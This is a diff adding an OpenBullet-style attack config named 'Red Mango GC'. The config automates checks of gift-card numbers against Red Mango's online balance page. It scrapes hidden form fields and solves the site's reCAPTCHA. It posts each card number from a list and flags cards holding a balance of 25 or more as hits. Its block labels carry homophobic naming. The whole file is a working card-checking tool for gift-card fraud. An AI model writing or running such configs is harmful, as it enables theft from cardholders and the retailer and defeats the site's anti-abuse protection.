@@ -1,0 +1,53 @@
+[SETTINGS]
+{
+  "Name": "Red Mango GC",
+  "SuggestedBots": 1,
+  "LastModified": "2018-07-07T10:00:23.730456+00:00",
+  "AdditionalInfo": "",
+  "Author": "Black Panther",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#HomoSexualPantherGET REQUEST GET "https://redmango.myguestaccount.com/guest/nologin/account-balance" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#HomoSexualPanther1 PARSE "<SOURCE>" LR " value=\"true\" type=\"hidden\" name=\"" "\">" Recursive=FALSE -> VAR "1" "" "" 
+#HomoSexualPanther2 PARSE "<SOURCE>" LR "nCardnumberSubmitButton\" name=\"" "\">Submit" Recursive=FALSE -> VAR "2" "" "" 
+#HomoSexualPantherFKN_RECAP RECAPTCHA "https://redmango.myguestaccount.com/guest/nologin/account-balance" "6LdndBYUAAAAAIE_sQA2y29GSRaKJHKx2DodPT6m" -> VAR "RECAP" 
+#HomoSexualPantherPOST REQUEST POST "https://redmango.myguestaccount.com/guest/nologin/account-balance" AutoRedirect=TRUE 
+  CONTENT "<1>=true&cardnum=<USER>&g-recaptcha-response=<RECAP>&<2>=" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#HomoSexualPantherBALANCE PARSE "<SOURCE>" LR "<div class=\"col-md-2\">" "</div>" Recursive=FALSE -> CAP "Balance" "" "" 
+#HomoSexualPantherBALANCE PARSE "<SOURCE>" LR "div class=\"col-md-2\">" "</div>" Recursive=FALSE -> VAR "Balance" "" "" 
+#HomoSexualPantherPoints PARSE "<SOURCE>" LR ">
+                      " "
+                      P" Recursive=FALSE -> CAP "Points" "" "" 
+#HomoSexuaLMINESWEEPER KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "Invalid card number." 
+    KEY "<Balance>" LessThan "25" 
+  KEYCHAIN Success OR 
+    KEY "<Balance>" GreaterThan "24" 
+  KEYCHAIN Retry OR 
+    KEY "Invalid CAPTCHA. Please try again." 
